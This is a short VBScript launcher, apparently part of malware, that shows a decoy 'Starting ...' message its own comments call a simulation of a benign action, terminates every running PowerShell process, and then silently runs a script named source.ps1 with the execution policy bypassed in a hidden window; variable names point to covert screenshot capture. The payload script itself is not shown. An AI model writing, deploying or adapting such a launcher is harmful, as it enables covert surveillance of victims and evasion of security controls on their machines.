' Create a shell object to interact with the Windows environment
Set objShell = CreateObject("WScript.Shell")

' Display a pop-up message when the script starts to simulate a benign action
MsgBox "Starting ...", vbInformation, "Info"

' Define the path to the PowerShell executable
powershellPath = "powershell.exe"

' Specify the path to the PowerShell script (assumed to be in the same directory as this VBS)
screenshotScriptPath = "source.ps1"

' Construct the command to run PowerShell with bypass and the script file
screenshotCommand = powershellPath & " -ExecutionPolicy Bypass -File """ & screenshotScriptPath & """"

' Function to terminate any running PowerShell processes
Sub KillPowerShellProcesses()
    ' Declare variables for WMI service and process collection
    Dim objWMIService, colProcesses, objProcess
    
    ' Connect to the Windows Management Instrumentation (WMI) service
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Query all processes to find instances of "powershell.exe"
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe'")

    ' Loop through each PowerShell process and terminate it
    For Each objProcess In colProcesses
        objProcess.Terminate() 
    Next
End Sub

' Call the function to stop any existing PowerShell instances
KillPowerShellProcesses()

' Launch the PowerShell script in hidden mode without waiting for completion
objShell.Run screenshotCommand, 0, False